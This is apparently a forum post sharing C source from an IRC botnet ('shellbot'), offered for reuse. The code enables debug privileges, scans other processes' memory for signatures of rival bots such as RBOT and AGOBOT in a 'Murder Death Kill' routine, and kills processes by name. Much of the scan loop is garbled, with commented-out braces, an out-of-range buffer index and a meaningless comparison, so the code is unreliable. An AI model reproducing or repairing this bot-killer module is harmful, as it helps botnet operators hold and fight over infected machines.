@@ -1,0 +1,422 @@
+ill post the code under incase nobody has shellbot
+	Code:
+	
+#include "C_includes.h"
+
+#pragma warning(disable : 4700)
+
+
+bool AdjustPrivileges()
+{
+   HANDLE hToken; TOKEN_PRIVILEGES tp;
+   TOKEN_PRIVILEGES oldtp; DWORD dwSize = sizeof(TOKEN_PRIVILEGES);
+   LUID luid;
+   if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))   {
+      if (GetLastError() == ERROR_CALL_NOT_IMPLEMENTED)
+         return true;
+      return false;
+   }
+   if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+      CloseHandle(hToken);
+      return false;
+   }
+   ZeroMemory(&tp, sizeof(tp));
+   tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
+   tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+   /* Adjust Token Privileges */
+   if (!AdjustTokenPrivileges (hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &oldtp, &dwSize))   {
+      CloseHandle(hToken);
+      return false;
+   }
+   // close handles
+    CloseHandle(hToken);
+   return true;
+}
+
+typedef struct {
+   DWORD  dwImageBase;
+   DWORD  dwSizeOfImage;
+   DWORD  dwEntryPointVA;
+} sProcessPEInfo;
+
+/*Fix me look at shellbot*/
+DWORD GetProcessEntryPoint(DWORD PID, char* szFilename)
+{
+   MODULEENTRY32  ModuleInfo; sProcessPEInfo  ProcPEInfo;
+   //! Create the snapshot of process modules
+   HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,PID);
+   if (hSnap == INVALID_HANDLE_VALUE)
+      return 0;
+   // init the ModuleInfo and the ProcPEInfo struct
+   ZeroMemory(&ModuleInfo,sizeof(ModuleInfo));
+   ModuleInfo.dwSize = sizeof(ModuleInfo);
+   ZeroMemory(&ProcPEInfo,sizeof(ProcPEInfo));   
+   //! Go through list of modules and
+   //! get our process image size from it :P
+   while (Module32Next(hSnap,&ModuleInfo)) {
+      //cout << ModuleInfo.szModule << endl;
+      if (stricmp((LPCTSTR)&ModuleInfo.szModule,(LPCTSTR)szFilename) == 0)
+         ProcPEInfo.dwImageBase = (DWORD)ModuleInfo.modBaseAddr;
+   }
+   CloseHandle(hSnap);
+   return ProcPEInfo.dwImageBase;
+}
+
+struct BotInfo {
+   char *sRawstring;
+   char *sBot;
+};
+
+BotInfo bInfo[] = {
+   { "ping",                         "URXBOT" },
+   { "Bot started",               "URXBOT" },
+   { "link-",                           "RBOT" },
+   { "[TFTP]: Server started",           "RBOT" },
+   { "rxbot_paradise",                 "RBOT" },
+   { "[THREADS]",                      "RBOT" },
+   { "realvnc",                  "AGOBOT" }
+};
+
+
+/* Murder Death Kill(vPOEBot*/
+void lpMDK()
+{
+   
+   
+   char sBuffer[1028];
+   //          int i;
+   HANDLE m_Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+   PROCESSENTRY32* processInfo=new PROCESSENTRY32; processInfo->dwSize=sizeof(PROCESSENTRY32);
+   int index=0; 
+   //! Get debug rights to open process with PROCESS_ALL_ACCESS
+   if (AdjustPrivileges())
+      while(Process32Next(m_Snapshot,processInfo) != FALSE) {
+         int iPID = processInfo->th32ProcessID;
+         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, iPID);
+         if (hProcess != NULL) {      
+            DWORD dwPointer = GetProcessEntryPoint(iPID, processInfo->szExeFile);
+            BYTE bBuffer[1];
+            
+            int szEndOfFile = 1;
+            //! Read the whole PE file in memory
+            while(szEndOfFile) {
+               if (ReadProcessMemory(hProcess, (LPCVOID)dwPointer,
+                  (LPVOID)&bBuffer, 1, NULL)) {
+                  if (bBuffer[0] != NULL) {
+                     for(int i=30; i<125; i++) {
+                        if (bBuffer[0] == (char)i)
+                           
+                           //                   }
+                           //                }
+                           //            }   
+                           //            else szEndOfFile = 0;
+                           //! Increase by 0x01 bytes
+                           dwPointer += 0x01;            
+                     }      
+                     
+                     bool bFound = false;
+                     //! Compare the buffer from memory to bot signatures
+                     for(i = 0; i < sBuffer[30000]; i++) {
+                        for(int p=0; p<sizeof(bInfo)/sizeof(BotInfo); p++) {
+                           if (i, strlen(bInfo[p].sRawstring), bInfo[p].sRawstring) {
+                              //   GetModuleFileName(GetModuleHandle(processInfo->szExeFile), szExeLoc, 255);
+                              bFound = true;
+                              break;
+                           }
+                        }
+                        if (bFound) break;
+                     }
+                  } else {   
+                     CloseHandle(hProcess);
+                     Sleep(1000);
+                  }    
+                  CloseHandle(m_Snapshot);
+                  ExitThread(0);
+               }
+               
+               
+               
+            }
+         }
+      }
+}
+
+int TerminateProc(const char *szToTerminate)
+{
+   
+   BOOL bResult,bResultm;
+   DWORD aiPID[1000],iCb=1000,iNumProc,iV2000=0;
+   DWORD iCbneeded,i,iFound=0;
+   char szName[MAX_PATH],szToTermUpper[MAX_PATH];
+   HANDLE hProc,hSnapShot,hSnapShotm;
+   OSVERSIONINFO osvi;
+    HINSTANCE hInstLib;
+   int iLen,iLenP,indx;
+    HMODULE hMod;
+   PROCESSENTRY32 procentry;     
+   MODULEENTRY32 modentry;
+   
+   // Transfer Process name into "szToTermUpper" and
+   // convert it to upper case
+   iLenP=strlen(szToTerminate);
+   if(iLenP<1 || iLenP>MAX_PATH) return 632;
+   for(indx=0;indx<iLenP;indx++)
+      szToTermUpper[indx]=toupper(szToTerminate[indx]);
+   szToTermUpper[iLenP]=0;
+   
+   // PSAPI Function Pointers.
+   BOOL (WINAPI *lpfEnumProcesses)( DWORD *, DWORD cb, DWORD * );
+   BOOL (WINAPI *lpfEnumProcessModules)( HANDLE, HMODULE *,
+        DWORD, LPDWORD );
+   DWORD (WINAPI *lpfGetModuleBaseName)( HANDLE, HMODULE,
+        LPTSTR, DWORD );
+   
+   // ToolHelp Function Pointers.
+   HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD,DWORD) ;
+   BOOL (WINAPI *lpfProcess32First)(HANDLE,LPPROCESSENTRY32) ;
+   BOOL (WINAPI *lpfProcess32Next)(HANDLE,LPPROCESSENTRY32) ;
+   BOOL (WINAPI *lpfModule32First)(HANDLE,LPMODULEENTRY32) ;
+   BOOL (WINAPI *lpfModule32Next)(HANDLE,LPMODULEENTRY32) ;
+   
+   // First check what version of Windows we're in
+   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+    bResult=GetVersionEx(&osvi);
+   if(!bResult)     // Unable to identify system version
+      return 606;
+   
+   // At Present we only support Win/NT/2000/XP or Win/9x/ME
+   if((osvi.dwPlatformId != VER_PLATFORM_WIN32_NT) &&
+      (osvi.dwPlatformId != VER_PLATFORM_WIN32_WINDOWS))
+      return 607;
+   
+    if(osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
+   {
+      // Win/NT or 2000 or XP
+      
+      // Load library and get the procedures explicitly. We do
+      // this so that we don't have to worry about modules using
+      // this code failing to load under Windows 9x, because
+      // it can't resolve references to the PSAPI.DLL.
+      hInstLib = LoadLibraryA("PSAPI.DLL");
+      if(hInstLib == NULL)
+            return 605;
+      
+      // Get procedure addresses.
+      lpfEnumProcesses = (BOOL(WINAPI *)(DWORD *,DWORD,DWORD*))
+            GetProcAddress( hInstLib, "EnumProcesses" ) ;
+      lpfEnumProcessModules = (BOOL(WINAPI *)(HANDLE, HMODULE *,
+            DWORD, LPDWORD)) GetProcAddress( hInstLib,
+            "EnumProcessModules" ) ;
+      lpfGetModuleBaseName =(DWORD (WINAPI *)(HANDLE, HMODULE,
+            LPTSTR, DWORD )) GetProcAddress( hInstLib,
+            "GetModuleBaseNameA" ) ;
+      
+      if(lpfEnumProcesses == NULL ||
+            lpfEnumProcessModules == NULL ||
+            lpfGetModuleBaseName == NULL)
+      {
+         FreeLibrary(hInstLib);
+         return 700;
+      }
+      
+      bResult=lpfEnumProcesses(aiPID,iCb,&iCbneeded);
+      if(!bResult)
+      {
+         // Unable to get process list, EnumProcesses failed
+            FreeLibrary(hInstLib);
+         return 701;
+      }
+      
+      // How many processes are there?
+      iNumProc=iCbneeded/sizeof(DWORD);
+      
+      // Get and match the name of each process
+      for(i=0;i<iNumProc;i++)
+      {
+         // Get the (module) name for this process
+         
+         strcpy(szName,"Unknown");
+         // First, get a handle to the process
+         hProc=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,
+            aiPID[i]);
+         // Now, get the process name
+         if(hProc)
+         {
+            if(lpfEnumProcessModules(hProc,&hMod,sizeof(hMod),&iCbneeded) )
+            {
+               iLen=lpfGetModuleBaseName(hProc,hMod,szName,MAX_PATH);
+            }
+         }
+         CloseHandle(hProc);
+         // We will match regardless of lower or upper case
+#ifdef BORLANDC
+            if(strcmp(strupr(szName),szToTermUpper)==0)
+#else
+            if(strcmp(_strupr(szName),szToTermUpper)==0)
+#endif
+            {
+               // Process found, now terminate it
+               iFound=1;
+               // First open for termination
+               hProc=OpenProcess(PROCESS_TERMINATE,FALSE,aiPID[i]);
+               if(hProc)
+               {
+                  if(TerminateProcess(hProc,0))
+                  {
+                     // process terminated
+                     CloseHandle(hProc);
+                     FreeLibrary(hInstLib);
+                     return 0;
+                  }
+                  else
+                  {
+                     // Unable to terminate process
+                     CloseHandle(hProc);
+                     FreeLibrary(hInstLib);
+                     return 602;
+                  }
+               }
+               else
+               {
+                  // Unable to open process for termination
+                  FreeLibrary(hInstLib);
+                  return 604;
+               }
+            }
+      }
+   }
+   
+   if(osvi.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
+   {
+      // Win/95 or 98 or ME
+      
+      hInstLib = LoadLibraryA("Kernel32.DLL");
+      if( hInstLib == NULL )
+         return 702;
+      
+      // Get procedure addresses.
+      // We are linking to these functions of Kernel32
+      // explicitly, because otherwise a module using
+      // this code would fail to load under Windows NT,
+      // which does not have the Toolhelp32
+      // functions in the Kernel 32.
+      lpfCreateToolhelp32Snapshot=
+         (HANDLE(WINAPI *)(DWORD,DWORD))
+         GetProcAddress( hInstLib,
+         "CreateToolhelp32Snapshot" ) ;
+      lpfProcess32First=
+         (BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
+         GetProcAddress( hInstLib, "Process32First" ) ;
+      lpfProcess32Next=
+         (BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
+         GetProcAddress( hInstLib, "Process32Next" ) ;
+      lpfModule32First=
+         (BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
+         GetProcAddress( hInstLib, "Module32First" ) ;
+      lpfModule32Next=
+         (BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
+         GetProcAddress( hInstLib, "Module32Next" ) ;
+      if( lpfProcess32Next == NULL ||
+         lpfProcess32First == NULL ||
+         lpfModule32Next == NULL ||
+         lpfModule32First == NULL ||
+         lpfCreateToolhelp32Snapshot == NULL )
+      {
+         FreeLibrary(hInstLib);
+         return 703;
+      }
+      
+      // The Process32.. and Module32.. routines return names in all uppercase
+      
+      // Get a handle to a Toolhelp snapshot of all the systems processes.
+      
+      hSnapShot = lpfCreateToolhelp32Snapshot(
+         TH32CS_SNAPPROCESS, 0 ) ;
+      if( hSnapShot == INVALID_HANDLE_VALUE )
+      {
+         FreeLibrary(hInstLib);
+         return 704;
+      }
+      
+        // Get the first process' information.
+        procentry.dwSize = sizeof(PROCESSENTRY32);
+        bResult=lpfProcess32First(hSnapShot,&procentry);
+      
+        // While there are processes, keep looping and checking.
+        while(bResult)
+        {
+         // Get a handle to a Toolhelp snapshot of this process.
+         hSnapShotm = lpfCreateToolhelp32Snapshot(
+            TH32CS_SNAPMODULE, procentry.th32ProcessID) ;
+         if( hSnapShotm == INVALID_HANDLE_VALUE )
+         {
+            CloseHandle(hSnapShot);
+            FreeLibrary(hInstLib);
+            return 704;
+         }
+         // Get the module list for this process
+         modentry.dwSize=sizeof(MODULEENTRY32);
+         bResultm=lpfModule32First(hSnapShotm,&modentry);
+         
+         // While there are modules, keep looping and checking
+         while(bResultm)
+         {
+            if(strcmp(modentry.szModule,szToTermUpper)==0)
+            {
+               // Process found, now terminate it
+               iFound=1;
+               // First open for termination
+               hProc=OpenProcess(PROCESS_TERMINATE,FALSE,procentry.th32ProcessID);
+               if(hProc)
+               {
+                  if(TerminateProcess(hProc,0))
+                  {
+                     // process terminated
+                     CloseHandle(hSnapShotm);
+                     CloseHandle(hSnapShot);
+                     CloseHandle(hProc);
+                     FreeLibrary(hInstLib);
+                     return 0;
+                  }
+                  else
+                  {
+                     // Unable to terminate process
+                     CloseHandle(hSnapShotm);
+                     CloseHandle(hSnapShot);
+                     CloseHandle(hProc);
+                     FreeLibrary(hInstLib);
+                     return 602;
+                  }
+               }
+               else
+               {
+                  // Unable to open process for termination
+                  CloseHandle(hSnapShotm);
+                  CloseHandle(hSnapShot);
+                  FreeLibrary(hInstLib);
+                  return 604;
+               }
+            }
+            else
+            {  // Look for next modules for this process
+               modentry.dwSize=sizeof(MODULEENTRY32);
+               bResultm=lpfModule32Next(hSnapShotm,&modentry);
+            }
+         }
+         
+         //Keep looking
+         CloseHandle(hSnapShotm);
+            procentry.dwSize = sizeof(PROCESSENTRY32);
+            bResult = lpfProcess32Next(hSnapShot,&procentry);
+        }
+      CloseHandle(hSnapShot);
+   }
+   if(iFound==0)
+   {
+      FreeLibrary(hInstLib);
+      return 603;
+   }
+   FreeLibrary(hInstLib);
+   return 0;
+}
+
